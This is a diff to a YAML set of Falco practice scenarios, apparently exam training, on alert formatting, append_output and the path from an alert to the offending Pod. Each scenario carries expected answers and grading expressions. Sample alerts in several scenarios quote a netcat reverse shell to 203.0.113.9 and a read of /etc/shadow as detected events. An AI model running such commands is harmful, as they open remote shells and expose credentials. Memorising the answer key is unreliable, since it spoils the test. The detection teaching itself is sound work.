@@ -23,6 +23,10 @@ introduction:
       - Falco's syntax changed over the years: this set uses the **current** forms (`rules_files`,
         `override:`), and points out the older ones you may still meet in tutorials (`rules_file`,
         `append: true`).
+      - Packages of Falco 0.41+ load the container plugin, and the default configuration appends the
+        container and Pod fields to every syscall alert. Sample alerts show them unless a scenario says
+        the node has them switched off. On a real task, start with `falco --version` and look at an
+        existing alert: the exam's Falco may be older than this one.
 
       **How answers are checked**
 
@@ -49,6 +53,75 @@ manifestDefinitions:
   apiVersion: networking.k8s.io/v1
   autoLoad: true
 scenarios:
+- title: Which Falco Is This?
+  category: Operating Falco
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      Falco's syntax and its default alert format changed between releases, and the Falco version on the
+      exam may differ from the one you practised with. The first thing to do on any Falco task is to
+      check what you are dealing with. You are `root` on `node01`.
+  - type: question
+    question:
+      questionType: command
+      header: Print the version of the installed Falco.
+      hint: Falco has a long option that prints version information and exits.
+      command:
+        executable: falco
+        flags:
+        - name: version
+          required: true
+          boolean: true
+  - type: manifest
+    header: $ falco --version
+    content: |
+      Falco version: 0.45.1
+      Libs version:  0.24.0
+      Plugin API:    3.12.0
+      Engine:        0.64.0
+      Driver:
+        API version:    9.1.0
+        Schema version: 2.0.0
+  - type: context
+    text: |
+      And here is one alert from the journal, produced by a default rule on this node:
+  - type: manifest
+    header: journal
+    content: |
+      Oct 20 09:41:07 node01 falco[1042]: 09:41:07.318204551: Notice A shell was spawned in a container with an attached terminal | evt_type=execve user=root user_uid=0 process=sh command=sh -c id terminal=34816 container_id=3f9c1a7e5b21 container_name=cart container_image_repository=registry.example/shop/cart container_image_tag=1.4.2 k8s_pod_name=cart-5d8f7b6c9-q2w8z k8s_ns_name=shop
+  - type: question
+    question:
+      questionType: single-line
+      expectedAnswer: k8s_pod_name
+      header: Which field in this alert tells you which Pod the shell was started in?
+      hint: Look at the end of the line, after the rule's own text.
+      correctAnswerInfo: 'The alert ends with key=value pairs that no default rule prints itself: Falco 0.41 and later append
+        container and Kubernetes fields to every syscall alert (see the append_output scenario).'
+      cel: answer.trim() == 'k8s_pod_name'
+  explanation:
+    elements:
+    - type: context
+      text: |
+        Two habits for every Falco task:
+
+        1. **`falco --version`** — decides which syntax is valid (`rules_files` vs `rules_file`,
+           `override:` vs `append: true`, availability of `append_output`, ...).
+        2. **Look at an existing alert** — it shows the output shape you are working with. Since **Falco
+           0.41** a package install also loads the *container plugin*, and the default
+           `append_output: - suggested_output: true` makes every syscall alert end with
+           `container_id=… container_name=… container_image_repository=… container_image_tag=…
+           k8s_pod_name=… k8s_ns_name=…`. That is why the default rules no longer print container fields
+           themselves. On older versions you would not see them.
+
+        This lab uses Falco 0.45 with a default package configuration; sample alerts below carry that
+        suffix unless a scenario says the node has it switched off.
+    - type: references
+      links:
+      - url: https://falco.org/docs/setup/packages/
+        text: Install Falco from packages
+      - url: https://falco.org/docs/concepts/outputs/formatting/
+        text: Alert formatting
 - title: Which Falco Service Runs on This Node?
   category: Operating Falco
   hintsEnabled: true
@@ -184,10 +257,10 @@ scenarios:
   - type: manifest
     header: $ journalctl -u falco-modern-bpf --since "10 minutes ago"
     content: |
-      Oct 20 10:14:02 node01 falco[1042]: 10:14:02.118429331: Notice A shell was spawned in a container with an attached terminal (user=root command=sh)
-      Oct 20 10:14:40 node01 falco[1042]: 10:14:40.902114870: Warning Sensitive file opened for reading by non-trusted program (user=root command=cat /etc/shadow file=/etc/shadow)
-      Oct 20 10:15:03 node01 falco[1042]: 10:15:03.337790145: Critical Reverse shell tool started (user=www-data command=nc -e /bin/sh 203.0.113.9 4444)
-      Oct 20 10:15:31 node01 falco[1042]: 10:15:31.640022918: Error File below /etc opened for writing (user=root command=sh -c echo x >> /etc/hosts file=/etc/hosts)
+      Oct 20 10:14:02 node01 falco[1042]: 10:14:02.118429331: Notice A shell was spawned in a container with an attached terminal (user=root command=sh) container_id=3f9c1a7e5b21 container_name=cart container_image_repository=registry.example/shop/cart container_image_tag=1.4.2 k8s_pod_name=cart-5d8f7b6c9-q2w8z k8s_ns_name=shop
+      Oct 20 10:14:40 node01 falco[1042]: 10:14:40.902114870: Warning Sensitive file opened for reading by non-trusted program (user=root command=cat /etc/shadow file=/etc/shadow) container_id=3f9c1a7e5b21 container_name=cart container_image_repository=registry.example/shop/cart container_image_tag=1.4.2 k8s_pod_name=cart-5d8f7b6c9-q2w8z k8s_ns_name=shop
+      Oct 20 10:15:03 node01 falco[1042]: 10:15:03.337790145: Critical Reverse shell tool started (user=www-data command=nc -e /bin/sh 203.0.113.9 4444) container_id=3f9c1a7e5b21 container_name=cart container_image_repository=registry.example/shop/cart container_image_tag=1.4.2 k8s_pod_name=cart-5d8f7b6c9-q2w8z k8s_ns_name=shop
+      Oct 20 10:15:31 node01 falco[1042]: 10:15:31.640022918: Error File below /etc opened for writing (user=root command=sh -c echo x >> /etc/hosts file=/etc/hosts) container_id=3f9c1a7e5b21 container_name=cart container_image_repository=registry.example/shop/cart container_image_tag=1.4.2 k8s_pod_name=cart-5d8f7b6c9-q2w8z k8s_ns_name=shop
   - type: question
     question:
       questionType: single-line
@@ -300,18 +373,22 @@ scenarios:
     content: |
       Defaulted container "falco" out of: falco, falcoctl-artifact-follow, (init) falcoctl-artifact-install
       Tue Oct 20 10:01:12 2026: Falco version: 0.45.1 (x86_64)
-      10:14:02.118429331: Notice A shell was spawned in a container with an attached terminal (user=root command=sh)
-      10:15:03.337790145: Critical Reverse shell tool started (user=www-data command=nc -e /bin/sh 203.0.113.9 4444)
+      10:14:02.118429331: Notice A shell was spawned in a container with an attached terminal (user=root command=sh) container_id=3f9c1a7e5b21 container_name=cart container_image_repository=registry.example/shop/cart container_image_tag=1.4.2 k8s_pod_name=cart-5d8f7b6c9-q2w8z k8s_ns_name=shop
+      10:15:03.337790145: Critical Reverse shell tool started (user=www-data command=nc -e /bin/sh 203.0.113.9 4444) container_id=3f9c1a7e5b21 container_name=web container_image_repository=registry.example/shop/cart container_image_tag=1.4.2 k8s_pod_name=web-6c9d8f7b5-lm4tq k8s_ns_name=shop
+  - type: context
+    text: |
+      The Helm values of this installation enable **output buffering** (to save CPU), and fresh alerts
+      now appear in `kubectl logs` only after a delay.
   - type: question
     question:
       questionType: single-line
-      expectedAnswer: output is buffered
-      header: You trigger a new alert and it does not show up in kubectl logs for several minutes. Which behaviour of Falco's
-        standard output explains that? Answer in a few words.
-      hint: Output sent to a pipe is normally collected in blocks before it is written.
-      correctAnswerInfo: Falco's stdout is buffered. The -U / --unbuffered option flushes every line immediately, at the cost
-        of more CPU.
-      cel: answer.lowerAscii().matches(r'buffer|unbuffered|-u\b')
+      expectedAnswer: 'buffered_outputs: false'
+      header: 'Which falco.yaml setting controls whether output channels such as stdout buffer their output, and which value
+        makes Falco flush after every alert? Answer as key: value.'
+      hint: The setting's name says what is buffered; the default value is the one that flushes immediately.
+      correctAnswerInfo: buffered_outputs defaults to false (flush on every alert). On the command line, -U / --unbuffered
+        has the same effect for a single run.
+      cel: answer.lowerAscii().replace(' ', '').replace('"', '') in ['buffered_outputs:false', 'buffered_outputs=false']
   explanation:
     elements:
     - type: context
@@ -326,8 +403,9 @@ scenarios:
         kubectl logs -n falco -l app.kubernetes.io/name=falco --prefix
         ```
 
-        Standard-output buffering can delay alerts when stdout is not a terminal; `-U` (unbuffered) is the
-        remedy when you need them immediately.
+        Alerts are flushed after every alert by default (`buffered_outputs: false`). If someone enabled
+        buffering, they appear late; set it back to `false` (or run Falco with `-U`) when you need them
+        immediately.
     - type: references
       links:
       - url: https://falco.org/docs/concepts/outputs/channels/
@@ -721,36 +799,51 @@ scenarios:
         text: Falco output channels
       - url: https://falco.org/docs/concepts/rules/basic-elements/
         text: 'Falco rules: basic elements'
-- title: Adding Pod Information to Every Alert
+- title: Adding Context to Every Alert
   category: Falco Configuration
   hintsEnabled: true
   elements:
   - type: context
     text: |
-      Many default rules print the process and file involved but not **which Pod** is responsible, so
-      every investigation starts with extra work. Without editing any rule, you want **every alert that
-      comes from a system call** to end with the container name, the Pod name and the namespace (written
-      as `container=… pod=… ns=…`, in that order).
+      Since Falco 0.41 every syscall alert already ends with container and Pod fields, as you saw in the
+      sample alert:
+  - type: manifest
+    header: alert
+    content: |
+      10:14:02.118429331: Notice A shell was spawned in a container with an attached terminal | evt_type=execve user=root process=sh command=sh -c id container_id=3f9c1a7e5b21 container_name=cart container_image_repository=registry.example/shop/cart container_image_tag=1.4.2 k8s_pod_name=cart-5d8f7b6c9-q2w8z k8s_ns_name=shop
+  - type: question
+    question:
+      questionType: single-line
+      expectedAnswer: suggested_output
+      header: Which falco.yaml setting is responsible for those appended fields? Name the key.
+      hint: The default value of one top-level setting is a list with a single entry; the entry's name says what Falco adds.
+      correctAnswerInfo: 'The entry append_output: - suggested_output: true asks every plugin for the fields it suggests for
+        output; the container plugin suggests the container and Pod fields.'
+      cel: answer.trim() in ['suggested_output', 'append_output.suggested_output', 'append_output']
+  - type: context
+    text: |
+      Responders also want the **parent process** on every syscall alert, as `parent=<name>`, added at
+      the end of the text — **without losing the container and Pod fields** and without editing any
+      rule. (A list in the configuration file replaces the default list; it does not extend it.)
   - type: question
     question:
       questionType: multiline
       expectedAnswer: |
         append_output:
+          - suggested_output: true
           - match:
               source: syscall
-            extra_output: "container=%container.name pod=%k8s.pod.name ns=%k8s.ns.name"
+            extra_output: "parent=%proc.pname"
       header: Write the setting for /etc/falco/falco.yaml.
-      hint: The setting is a list; each entry can say which rules it applies to and what text to append. Fields that are only
-        added to the JSON output do not change the text message.
+      hint: Keep the default entry and add a second one that appends text. Fields that are only added to the JSON output do
+        not change the text message.
       correctAnswerInfo: extra_fields only enrich the JSON output_fields and never change the regular text line; extra_output
-        is what is appended to the message.
+        is what is appended to the message. Without the suggested_output entry the container and Pod fields would disappear.
       cel: |-
         (answer.matches(r'(^|\n)append_output:')) &&
-        (answer.matches(r'extra_output:\s*[\x27"]?[^\n]*%container\.name[^\n]*%k8s\.pod\.name[^\n]*%k8s\.ns\.name')) &&
-        (answer.matches(r'source:\s*syscall|(^|\n)\s*-\s*extra_output')) &&
-        (answer.matches(r'container=%container\.name')) &&
-        (answer.matches(r'pod=%k8s\.pod\.name')) &&
-        (answer.matches(r'ns=%k8s\.ns\.name'))
+        (answer.matches(r'suggested_output:\s*true')) &&
+        (answer.matches(r'extra_output:\s*[\x27"]?[^\n]*parent=%proc\.pname')) &&
+        (answer.matches(r'source:\s*syscall|(^|\n)\s*-\s*extra_output'))
   explanation:
     elements:
     - type: context
@@ -760,15 +853,18 @@ scenarios:
 
         ```yaml
         append_output:
+          - suggested_output: true          # the packaged default: container and Pod fields
           - match:
-              source: syscall            # or: rule: "<name>"  or: tags: [container]
-            extra_output: "container=%container.name pod=%k8s.pod.name ns=%k8s.ns.name"
+              source: syscall               # or: rule: "<name>"  or: tags: [container]
+            extra_output: "parent=%proc.pname"
             extra_fields:
-              - k8s.pod.uid              # only added to the JSON output_fields
+              - k8s.pod.uid                 # only added to the JSON output_fields
         ```
 
-        Without `match`, the entry applies to every rule. To *replace* the output of one rule instead,
-        use an override in a rules file (see the override scenarios).
+        Remember that the value is a **list that replaces the default list**: if you define
+        `append_output`, repeat `- suggested_output: true` or you silently lose the container and Pod
+        fields. Without `match`, an entry applies to every rule. To *replace* the output of one rule
+        instead, use an override in a rules file (see the override scenarios).
     - type: references
       links:
       - url: https://falco.org/docs/concepts/outputs/formatting/
@@ -872,8 +968,13 @@ scenarios:
 
       `10:52:07.123456789,0,sh`
 
-      (Falco adds the usual `<time>: <Priority>` prefix on its own.) Keep the rule's condition and
-      priority as they are.
+      Falco adds the usual `<time>: <Priority>` prefix on its own, but **nothing else may follow the three
+      values on the line**. Keep the rule's condition and priority as they are. This is what the rule
+      produces today:
+  - type: manifest
+    header: alert (current)
+    content: |
+      10:52:07.123456789: Notice A shell was spawned in a container with an attached terminal | evt_type=execve user=root user_uid=0 process=sh container_id=3f9c1a7e5b21 container_name=cart container_image_repository=registry.example/shop/cart container_image_tag=1.4.2 k8s_pod_name=cart-5d8f7b6c9-q2w8z k8s_ns_name=shop
   - type: question
     question:
       questionType: multiline
@@ -892,6 +993,28 @@ scenarios:
         (answer.matches(r'(override:\s*(\n\s+|\{\s*)output:\s*replace)|(\n\s+condition:)')) &&
         (!answer.matches(r'priority:')) &&
         (!answer.matches(r'output:\s*append'))
+  - type: context
+    text: |
+      You apply that file and trigger the rule. The alert now looks like this:
+  - type: manifest
+    header: alert (after the rule change)
+    content: |
+      10:52:07.123456789: Notice 10:52:07.123456789,0,sh container_id=3f9c1a7e5b21 container_name=cart container_image_repository=registry.example/shop/cart container_image_tag=1.4.2 k8s_pod_name=cart-5d8f7b6c9-q2w8z k8s_ns_name=shop
+  - type: question
+    question:
+      questionType: multiline
+      expectedAnswer: |
+        append_output: []
+      header: The output string is right, but the line still does not end after the three values. Write the setting for /etc/falco/falco.yaml
+        that removes the extra text from every alert.
+      hint: The extra fields come from a default entry of a list-valued setting in falco.yaml. Replacing that list with an
+        empty one, or switching the entry off, removes them.
+      correctAnswerInfo: 'Since Falco 0.41 the packaged default is append_output: - suggested_output: true. For an output
+        that is graded exactly, that suffix must go; for everyday use you would keep it.'
+      cel: |-
+        (answer.matches(r'(^|\n)append_output:')) &&
+        (answer.matches(r'append_output:\s*\[\s*\]|suggested_output:\s*false')) &&
+        (!answer.matches(r'suggested_output:\s*true'))
   explanation:
     elements:
     - type: context
@@ -908,7 +1031,8 @@ scenarios:
         | `%k8s.pod.name`, `%k8s.ns.name` | Pod and namespace |
 
         When a format is **graded exactly**, copy it character by character: separators, spacing and field
-        order all count. `override: output: replace` swaps the whole string; `append` would add to the
+        order all count — and remember what Falco appends on its own: since 0.41 the container and Pod
+        fields from `append_output`/`suggested_output`, which you turn off with `append_output: []`. `override: output: replace` swaps the whole string; `append` would add to the
         original text.
     - type: references
       links:
@@ -1264,6 +1388,11 @@ scenarios:
           priority: WARNING
         ```
 
+        (In Falco 0.41+ the container and Pod fields are also appended to every alert automatically, so
+        this exercise's explicit `container=… pod=… ns=…` repeats them. The task asks for them because a
+        rule's output should stand on its own: the suffix can be switched off, and older versions never
+        had it.)
+
         The three building blocks of a condition: an **event** (`spawned_process`, or `evt.type in (execve,
         execveat)`), a **scope** (`container`, i.e. `container.id != host`) and a **filter**
         (`proc.name in (shell_binaries)`). `macro`s name reusable condition fragments, `list`s name
@@ -1580,8 +1709,7 @@ scenarios:
       command:
         executable: falco
         flags:
-        - name: describe-all
-          short: L
+        - name: L
           required: true
           boolean: true
   - type: question
@@ -1592,8 +1720,7 @@ scenarios:
       command:
         executable: falco
         flags:
-        - name: describe-rule
-          short: l
+        - name: l
           required: true
       cel: answer.contains('Terminal shell in container')
   - type: question
@@ -1675,13 +1802,11 @@ scenarios:
       command:
         executable: falco
         flags:
-        - name: rules
-          short: r
+        - name: r
           required: true
           regex: ^/(etc/falco/falco_rules\.yaml|root/shadow-rule\.yaml)$
           repeatable: true
-        - name: duration
-          short: M
+        - name: M
           required: true
           regex: ^120$
       cel: answer.contains('/etc/falco/falco_rules.yaml') && answer.contains('/root/shadow-rule.yaml') && answer.indexOf('/etc/falco/falco_rules.yaml')
@@ -1722,7 +1847,7 @@ scenarios:
   - type: manifest
     header: (Falco output)
     content: |
-      11:42:30.552310976: Warning Sensitive file read in container (user=root process=cat file=/etc/shadow container=web pod=web-6c9d8f7b5-lm4tq)
+      11:42:30.552310976: Warning Sensitive file read in container (user=root process=cat file=/etc/shadow container=web pod=web-6c9d8f7b5-lm4tq) container_id=9d41a07c3e55 container_name=web container_image_repository=registry.example/shop/web container_image_tag=2.1.0 k8s_pod_name=web-6c9d8f7b5-lm4tq k8s_ns_name=shop
   - type: question
     question:
       questionType: single-line
@@ -1750,13 +1875,82 @@ scenarios:
         text: Falco rules
       - url: https://falco.org/docs/setup/packages/
         text: Install Falco from packages (systemd units)
+- title: Alerts That Already Name the Pod
+  category: Investigating with Falco
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      On a current Falco (0.41+) with the default configuration, alerts carry the container and Pod
+      fields themselves. This one arrived on `node01`:
+  - type: manifest
+    header: journal
+    content: |
+      Oct 20 11:48:17 node01 falco[2210]: 11:48:17.302118764: Critical Reverse shell tool started (user=root command=nc -e /bin/sh 203.0.113.9 4444) container_id=b52e8a41d7c0 container_name=billing-worker container_image_repository=registry.example/shop/billing container_image_tag=3.4.1 k8s_pod_name=billing-worker-7f6d9c5b8-kq2mt k8s_ns_name=shop
+  - type: question
+    question:
+      questionType: single-line
+      expectedAnswer: billing-worker-7f6d9c5b8-kq2mt
+      header: Which Pod raised the alert? Answer with the Pod name.
+      hint: Read the key=value pairs at the end of the line.
+      cel: answer.trim() == 'billing-worker-7f6d9c5b8-kq2mt'
+  - type: question
+    question:
+      questionType: command
+      header: Record the finding in /root/finding.txt as a single line <namespace>/<pod-name>, with nothing else.
+      command:
+        executable: echo
+        strictness: permissive
+      cel: answer.matches(r'^echo\s+[\x27"]?shop/billing-worker-7f6d9c5b8-kq2mt[\x27"]?\s*>\s*/root/finding\.txt$')
+  - type: context
+    text: |
+      The Pod belongs to the Deployment `billing-worker` (its name without the ReplicaSet hash and the Pod suffix).
+  - type: question
+    question:
+      questionType: command
+      header: Stop the workload by scaling that Deployment to zero.
+      command:
+        executable: kubectl
+        subcommands:
+        - name: scale
+        positionals:
+        - index: 0
+          regex: ^(deployment|deploy|deployments)(/billing-worker)?$
+        - index: 1
+          required: false
+          value: billing-worker
+        flags:
+        - name: replicas
+          required: true
+          value: '0'
+        - name: namespace
+          short: n
+          required: true
+          value: shop
+  explanation:
+    elements:
+    - type: context
+      text: |
+        With the container plugin's suggested fields, the alert already tells you `k8s_pod_name` and
+        `k8s_ns_name`, so the container-runtime lookup of the next scenario is unnecessary. The rest of the
+        chain stays the same: find the **owner** (here recognisable from the name; verify with
+        `ownerReferences` when in doubt), scale it down instead of deleting the Pod, and record the finding
+        exactly as requested.
+
+        Older Falco versions, or nodes where `append_output` was emptied, only give you what the rule's own
+        output prints — often just a container ID — which is the situation of the next scenario.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/outputs/formatting/
+        text: Alert formatting
 - title: From a Falco Alert to the Offending Pod
   category: Investigating with Falco
   hintsEnabled: true
   elements:
   - type: context
     text: |
-      Falco on `node01` raised this alert. It names the **container ID** but not the Pod:
+      Falco on `node01` raised this alert. On this node the packaged suffix is switched off
+      (`append_output: []`), and the custom rule prints only the **container ID**, not the Pod:
   - type: manifest
     header: journal
     content: |
@@ -1873,9 +2067,9 @@ scenarios:
       text: |
         The standard **alert → Pod → owner → action** chain:
 
-        1. Falco gives a `container.id` (the first 12 characters of the container ID) — or directly
-           `k8s.pod.name`/`k8s.ns.name` if the rule's output includes them (add them with
-           `append_output`!).
+        1. Falco gives a `container.id` (the first 12 characters of the container ID) — and, when the
+           container plugin's suggested output is active (the default since Falco 0.41) or the rule's output
+           prints them, directly `k8s_pod_name`/`k8s_ns_name`.
         2. `crictl ps --id <id>` (or `crictl inspect <id>`) maps the container to its Pod and namespace.
         3. The Pod's `metadata.ownerReferences` leads to the ReplicaSet, and from there to the
            Deployment. Never just delete the Pod: the controller recreates it.
@@ -1896,6 +2090,7 @@ scenarios:
     text: |
       The rule `Shell in my containers` is noisy. Management asks **which Pod started the most shells**
       in the last stretch of the journal. The rule's text output starts with `Shell started in container`.
+      (The lines below are shortened: the automatic container and Pod suffix is not shown.)
   - type: question
     question:
       questionType: command
@@ -2085,7 +2280,8 @@ scenarios:
 
       - its priority is `ERROR`;
       - its alert text is exactly the event time, the numeric user id and the process name, in this order,
-        separated by commas without spaces (Falco adds its usual prefix);
+        separated by commas without spaces, and **nothing follows them on the line** (apart from Falco's
+        usual `<time>: <Priority>` prefix);
       - the change is made in the local rules file and survives upgrades.
 
       Then validate, restart, trigger the rule from Pod `web-6c9d8f7b5-lm4tq` in the namespace `shop`
@@ -2109,8 +2305,18 @@ scenarios:
         (answer.split('override:')[1].matches(r'output:\s*replace'))
   - type: question
     question:
+      questionType: multiline
+      expectedAnswer: |
+        append_output: []
+      header: 2. Write the falco.yaml setting that removes everything Falco appends to alerts on its own.
+      cel: |-
+        (answer.matches(r'(^|\n)append_output:')) &&
+        (answer.matches(r'append_output:\s*\[\s*\]|suggested_output:\s*false')) &&
+        (!answer.matches(r'suggested_output:\s*true'))
+  - type: question
+    question:
       questionType: command
-      header: 2. Validate the default rules file together with the local file.
+      header: 3. Validate the default rules file together with the local file.
       command:
         executable: falco
         flags:
@@ -2124,7 +2330,7 @@ scenarios:
   - type: question
     question:
       questionType: command
-      header: 3. Restart the Falco service.
+      header: 4. Restart the Falco service.
       command:
         executable: systemctl
         subcommands:
@@ -2135,7 +2341,7 @@ scenarios:
   - type: question
     question:
       questionType: command
-      header: '4. Trigger the rule: open an interactive shell in the Pod (the rule only fires for a terminal).'
+      header: '5. Trigger the rule: open an interactive shell in the Pod (the rule only fires for a terminal).'
       hint: The rule includes a condition on a terminal being attached to the process; kubectl needs two options for that.
       command:
         executable: kubectl
@@ -2162,7 +2368,7 @@ scenarios:
   - type: question
     question:
       questionType: command
-      header: 5. Show what the Falco unit logged during the last minute.
+      header: 6. Show what the Falco unit logged during the last minute.
       command:
         executable: journalctl
         flags:
@@ -2183,7 +2389,7 @@ scenarios:
     question:
       questionType: single-line
       expectedAnswer: Error
-      header: 6. Which priority does the alert carry?
+      header: 7. Which priority does the alert carry?
       cel: answer.lowerAscii().trim() == 'error'
   explanation:
     elements:
@@ -2217,7 +2423,8 @@ scenarios:
       1. Create a rule `Network tool in container` in `/etc/falco/rules.d/nettools.yaml` for `nc` or
          `nmap` started in a container, priority `CRITICAL`; its alert text must contain the user, the
          command line, the **container ID** and the image repository (as `user=… command=… container_id=…
-         image=…`).
+         image=…`). On this node the automatic suffix is switched off (`append_output: []`), so the rule's
+         own output is all an alert contains.
       2. Validate, then restart the service.
       3. After the next alert, find the Pod, scale its owning Deployment to zero, and record the
          offender in `/root/offender.txt` as `<namespace>,<pod-name>`.
@@ -2346,8 +2553,8 @@ scenarios:
         | contain | `kubectl scale ... --replicas=0` (or a NetworkPolicy, or delete the owner) |
         | document | write the finding in exactly the requested format |
 
-        Put `k8s.pod.name` and `k8s.ns.name` into the rule's output (or use `append_output`) and the
-        identification step disappears — a good habit for real clusters.
+        Put `k8s.pod.name` and `k8s.ns.name` into the rule's output (or keep the default
+        `suggested_output`) and the identification step disappears — a good habit for real clusters.
     - type: references
       links:
       - url: https://falco.org/docs/concepts/rules/basic-elements/
